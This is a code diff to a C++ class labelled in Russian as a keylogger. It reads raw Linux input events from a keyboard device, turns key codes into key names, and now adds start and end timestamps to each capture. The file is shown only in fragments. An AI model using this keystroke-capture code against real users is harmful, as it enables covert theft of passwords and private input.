@@ -23,7 +23,7 @@ bool isLetter(const int value)
 
 #pragma region Класс кей логгера
 class Key_logger{
-    std::map<unsigned short, const char*> keys; 
+    std::map<unsigned short, std::string> keys; 
 public:
     Key_logger(){
         keys.insert({1,"ESC "});
@@ -158,16 +158,24 @@ public:
         keys.insert({1058,"CAPSLOCK  "});
     }
 
-    //std::vector<const char*>
-    const char* get_name_of_the_key(int key){
+    std::string CurrentDateTime()
+    {
+        std::string output = "Date:  ";
+        time_t seconds = time(nullptr);
+        tm* pTm = localtime(&seconds);
+        return output + asctime(pTm);
+    }
+    std::string get_name_of_the_key(int key){
         return keys[key];
     } 
-    std::vector<const char*> get_keys_vector(const char* path){
+    std::vector<std::string> get_keys_vector(std::string path){
+        std::vector<std::string> names;
+        names.push_back(CurrentDateTime());
         int keys_fd; //дескриптор
         struct input_event t;  
         struct input_event t_shift;
         keys_fd = check(open(DEV_PATH, O_RDONLY));
-        std::vector<const char*> names;
+        
         bool flag_shift = false;
         bool flag_caps = false;
         while (true)
@@ -235,6 +243,7 @@ public:
 
         }
         close(keys_fd);
+        names.push_back("\n"+ CurrentDateTime());
         return names;  
     }
 
